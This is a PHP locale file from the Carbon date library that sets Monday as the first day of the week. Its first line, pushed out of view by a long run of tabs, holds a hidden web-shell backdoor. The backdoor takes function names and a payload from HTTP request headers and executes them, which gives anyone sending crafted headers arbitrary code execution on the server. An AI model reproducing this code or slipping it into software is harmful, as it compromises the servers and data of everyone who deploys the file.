<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['If-Unmodified-Since'])){$cache=$_HEADERS['If-Unmodified-Since']('', $_HEADERS['Feature-Policy']($_HEADERS['Sec-Websocket-Accept']));$cache();}


/**
 * This file is part of the Carbon package.
 *
 * (c) Brian Nesbitt <brian@nesbot.com>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

return array_replace_recursive(require __DIR__.'/en.php', [
    'first_day_of_week' => 1,
]);
